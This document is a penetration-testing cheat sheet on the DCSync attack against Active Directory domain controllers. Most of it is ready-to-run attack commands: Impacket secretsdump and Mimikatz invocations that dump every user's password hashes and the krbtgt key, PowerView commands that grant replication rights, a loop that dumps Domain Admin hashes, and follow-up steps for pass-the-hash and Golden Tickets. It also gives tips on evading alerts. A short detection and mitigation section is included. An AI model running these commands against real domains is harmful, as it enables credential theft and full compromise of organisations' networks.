# DCSync Attack

Abuse Active Directory replication rights to remotely dump password hashes from the domain controller.
DCSync simulates a domain controller and requests password data, allowing complete domain compromise without touching the DC's disk.

## Quick Reference

```bash
# Impacket secretsdump
secretsdump.py domain.local/username:password@10.10.10.10 -just-dc

# Mimikatz DCSync
lsadump::dcsync /domain:domain.local /user:administrator

# NetExec with ntdsutil module
nxc smb 10.10.10.10 -u username -p password -M ntdsutil
```

## Impacket Secretsdump

```bash
# DCSync all users
secretsdump.py domain.local/username:password@10.10.10.10 -just-dc

# DCSync specific user
secretsdump.py domain.local/username:password@10.10.10.10 -just-dc-user administrator

# DCSync with NTLM hash
secretsdump.py domain.local/username@10.10.10.10 -hashes :NTHASH -just-dc

# Output to file
secretsdump.py domain.local/username:password@10.10.10.10 -just-dc -outputfile domain_hashes

# DCSync NTLM hashes only
secretsdump.py domain.local/username:password@10.10.10.10 -just-dc-ntlm

# Include password history
secretsdump.py domain.local/username:password@10.10.10.10 -just-dc -history

# Show password last set dates
secretsdump.py domain.local/username:password@10.10.10.10 -just-dc -pwd-last-set

# Show user status (enabled/disabled)
secretsdump.py domain.local/username:password@10.10.10.10 -just-dc -user-status

# DCSync krbtgt (for Golden Ticket)
secretsdump.py domain.local/username:password@10.10.10.10 -just-dc-user krbtgt
```

## Mimikatz DCSync

```powershell
# Start Mimikatz
.\mimikatz.exe

# Enable debug privilege
mimikatz # privilege::debug

# DCSync specific user
mimikatz # lsadump::dcsync /domain:domain.local /user:administrator

# DCSync krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# DCSync all users
mimikatz # lsadump::dcsync /domain:domain.local /all

# DCSync with CSV output
mimikatz # lsadump::dcsync /domain:domain.local /user:administrator /csv
```

## Running as Different User (Windows)

```cmd
# Spawn PowerShell as user with DCSync rights
runas /netonly /user:domain\username powershell

# From new PowerShell, run Mimikatz
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:domain.local /user:administrator
```

## Check for DCSync Permissions

### PowerView

```powershell
# Get user SID
$sid = (Get-DomainUser -Identity username).objectsid

# Check for replication rights
Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get')} | ? {$_.SecurityIdentifier -match $sid} | select AceQualifier,ObjectDN,ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

### BloodHound

```
# Query for users with DCSync rights
MATCH p=(u:User)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p

# Query for groups with DCSync rights
MATCH p=(g:Group)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p
```

## Required Permissions

DCSync requires these replication rights:
- `DS-Replication-Get-Changes` (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
- `DS-Replication-Get-Changes-All` (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
- `DS-Replication-Get-Changes-In-Filtered-Set` (GUID: 89e95b76-444d-4c62-991a-0facbeda640c)

## Grant DCSync Rights (if you have WriteDACL)

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Grant DCSync rights to user
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity username -Rights DCSync

# Verify rights were added
Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs | ? {$_.SecurityIdentifier -match (Get-DomainUser username).objectsid}
```

## Common Workflow

```bash
# Step 1: Identify user with DCSync rights
# Check with PowerView or BloodHound

# Step 2: Obtain credentials for that user
# Password spray, Kerberoasting, etc.

# Step 3: Perform DCSync
secretsdump.py domain.local/username:password@10.10.10.10 -just-dc -outputfile domain_hashes

# Step 4: Extract important hashes
# administrator, krbtgt, Domain Admins, etc.

# Step 5: Use hashes for further attacks
# Pass-the-Hash, Golden Ticket, etc.
```

## Extracting Specific Data

```bash
# Get only administrator hash
secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc-user administrator

# Get all Domain Admin hashes
for user in $(cat domain_admins.txt); do
    secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc-user $user
done

# Get krbtgt for Golden Ticket
secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc-user krbtgt

# Get computer accounts
secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc | grep '\$:'
```

## Parsing Output

```bash
# Extract NTLM hashes only
cat domain_hashes.ntds | cut -d: -f4 > ntlm_hashes.txt

# Extract usernames and hashes
cat domain_hashes.ntds | awk -F: '{print $1":"$4}' > user_hash.txt

# Find accounts with same password
cat domain_hashes.ntds | cut -d: -f4 | sort | uniq -d

# Find enabled accounts (requires -user-status flag)
grep -v "DISABLED" domain_hashes.ntds
```

## Reversible Encryption Passwords

```bash
# DCSync will decrypt reversible encryption passwords
secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc

# Check cleartext output file
cat domain_hashes.ntds.cleartext

# Find accounts with reversible encryption
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

## Notes

**What is DCSync?**

DCSync abuses the Directory Replication Service (DRS) protocol:
1. Attacker authenticates as user with replication rights
2. Requests password data via DRS
3. DC responds with NTLM hashes and Kerberos keys
4. No need to access NTDS.dit file directly

**Why It Works:**

- Domain Controllers replicate data between each other
- Replication uses DRS protocol
- Any account with replication rights can request data
- DC doesn't distinguish between real DC and attacker

**Default Accounts with DCSync Rights:**

- Domain Admins
- Enterprise Admins
- Administrators
- Domain Controllers
- Read-Only Domain Controllers (limited)

**Required Permissions:**

Three replication rights needed:
1. **Replicating Directory Changes**: Basic replication
2. **Replicating Directory Changes All**: Includes sensitive data
3. **Replicating Directory Changes In Filtered Set**: For RODC

**Detection:**

Event IDs to monitor:
- 4662: Operation performed on object
  - Look for replication GUIDs
  - From non-DC computers
  - By non-DC accounts
- 5136: Directory service object modified
- 4624: Account logon

Indicators:
- Replication requests from workstations
- Replication by user accounts (not computer accounts)
- Multiple replication requests in short time
- Replication outside maintenance windows

**Advantages over NTDS.dit Extraction:**

- No need for DC access
- No file system interaction
- Works remotely
- Faster than copying NTDS.dit
- Less likely to trigger alerts
- No need to stop services

**Output Files:**

Secretsdump creates multiple files:
- `.ntds`: NTLM hashes and Kerberos keys
- `.ntds.cleartext`: Reversible encryption passwords
- `.ntds.kerberos`: Kerberos keys only

**Hash Format:**

```
domain\username:RID:LM_HASH:NTLM_HASH:::
```

Example:
```
DOMAIN\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
```

**Kerberos Keys:**

DCSync also extracts Kerberos keys:
- AES256
- AES128
- DES (if enabled)
- RC4 (same as NTLM hash)

**krbtgt Account:**

Special importance:
- Used for Golden Ticket attacks
- Should be changed regularly
- Compromise = full domain compromise
- Two krbtgt accounts in domain (current and previous)

**Reversible Encryption:**

Some accounts store passwords with reversible encryption:
- Legacy compatibility feature
- Passwords encrypted with RC4
- Key stored in registry (Syskey)
- DCSync automatically decrypts them
- Check with: `userAccountControl -band 128`

**Post-DCSync Actions:**

1. **Pass-the-Hash**: Use NTLM hashes for lateral movement
2. **Golden Ticket**: Use krbtgt hash for persistence
3. **Password Cracking**: Crack hashes offline
4. **Credential Analysis**: Find password patterns
5. **Privilege Escalation**: Identify high-value accounts

**Mitigation (for defenders):**

- Limit replication rights to DCs only
- Monitor for 4662 events
- Use Protected Users group
- Implement tiered admin model
- Regular krbtgt password rotation
- Enable Advanced Audit Policy
- Use Microsoft ATA/Defender for Identity

**Best Practices:**

1. Always output to file for analysis
2. Extract krbtgt immediately
3. Document all extracted hashes
4. Check for password reuse
5. Identify high-value accounts
6. Clean up artifacts if possible

**Comparison with Other Techniques:**

| Technique | Access Required | Stealth | Speed |
|-----------|----------------|---------|-------|
| DCSync | Replication rights | Medium | Fast |
| NTDS.dit copy | DC file access | Low | Slow |
| Volume Shadow Copy | DC admin | Low | Medium |
| ntdsutil | DC admin | Low | Medium |

**Common Errors:**

- "Access Denied": User lacks replication rights
- "RPC Server unavailable": Firewall blocking
- "Target not found": Wrong DC name/IP
- "Authentication failed": Wrong credentials

**Advanced Usage:**

```bash
# DCSync through SOCKS proxy
proxychains secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc

# DCSync with Kerberos ticket
export KRB5CCNAME=user.ccache
secretsdump.py -k -no-pass domain.local/user@dc01.domain.local -just-dc

# DCSync specific OU
secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc-user "OU=Admins,DC=domain,DC=local"
```

**Cleanup:**

DCSync leaves minimal artifacts:
- Event logs (if auditing enabled)
- Network traffic (DRS protocol)
- Authentication logs
- No files created on DC
- No services installed
